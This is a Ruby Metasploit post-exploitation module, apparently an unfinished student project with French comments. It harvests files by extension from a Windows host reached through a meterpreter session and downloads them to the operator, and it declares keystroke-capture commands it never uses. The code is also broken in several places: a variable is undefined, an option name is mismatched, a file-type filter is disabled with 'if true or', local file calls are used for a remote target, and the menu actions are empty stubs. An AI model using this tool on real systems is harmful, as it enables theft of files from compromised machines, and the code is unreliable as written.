##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File

  SELECT_UP = "A"
  SELECT_DOWN = "B"
  SELECT_READ_FILE = "read"
  SELECT_SAVE_FILE = "save"

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'files manager for windows',
        'Description' => %q{
          get a resource from a system windows
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Adil et Lazare' ],
        'Platform' => [ 'win', 'linux',],
        'SessionTypes' => [ 'meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
              stdapi_railgun_api
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_ui_get_idle_time
              stdapi_ui_get_keys_utf8
              stdapi_ui_start_keyscan
              stdapi_ui_stop_keyscan
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('EXTENSION', [false, 'File Extension to harvest', '']),
        OptPath.new('STARTING_POINT_PATH', [false, 'Starting point', '']),
        OptPath.new('SAVE_PATH', [false, 'path where the files will be saved.', '']),
        OptBool.new('VERBOSE', [false, 'verbose mode', false]),
        OptString.new('FILE_NAME', [false, 'search a specific file', '']),
      ]
    )
  end

  def download_file(file_to_download)

    save_path = datastore['SAVE_PATH'
  ]
    begin
      print_status("Downloading file #{file_path}...")
      client.fs.file.download(save_path, file_path)
      print_good("File downloaded successfully to #{save_path}")
    rescue ::Exception => e
      print_error("Failed to download file: #{e.message}")
    end
  end
    # Méthode pour récupérer les fichiers avec l'extension donnée en option
  # on parcourt récursivement les répertoires à partir du point de départ donné en option
  def get_files_list()

    extension = datastore['EXTENSION']
    starting_point = datastore['STARTING_POINT']
    verbose = datastore['VERBOSE']

      files = []
  
      if verbose == true then puts "browsing subdirectories..." end

        i=0
      Dir.glob("#{starting_point}/**/*").each do |file|
        # TODO: retirer condition test
        if true or File.file?(file) && File.extname(file) == ".#{extension}"

            if verbose == true
              # puts "file with "+extension+" found !"
              puts "found : "+File.expand_path(file)
            end
            i=i+1
            files << file

            # On arrête le scan après 50 fichiers pour tester facilement, à delete
            if i > 100 then
              return files
            end
        end
      end
  
      return files
    end

  # Méthode permettant d'afficher la liste des fichiers trouvés
  def draw_menu(files)
    index=0
    loop do
      system('clear')
      puts "found #{files.length} files"

      # Pour afficher la flèche indiquant le fichier sélectionné
      selected=true
      files[index..index+50].each do |file|
        if selected
          puts "--> #{File.expand_path(file)}"
          selected = false
        else
          puts File.expand_path(file)
        end
      end
      print "\e[999B" # Déplacer le curseur en bas de l'écran
      print "\e[999D" # Déplacer le curseur à gauche (au début de la ligne)

      puts "[Z] exit"
      choice=get_input()
      case choice
      when SELECT_UP
        index -= 1 if index > 0
      when SELECT_DOWN
        index += 1 if index < files.length-1
      when SELECT_READ_FILE
        # ...
      when SELECT_SAVE_FILE
        # ...
      when ""
        return
      end
    end
  end

  # Ecoute le prochain input et le renvoie
  def get_input()
    loop do
      # Lit une seule touche du terminal sans attendre
      input = STDIN.getch

      if input == "z"
        return ""
      end

      # Si flèche directionnelle
      if input == "\e" and STDIN.getch == "["
        input = STDIN.getch
        return input
      end
    end
  end

  def run
    puts "hello"
    puts "Retrieveing files..."
    files = get_files_list()
    draw_menu(files)
  end
end
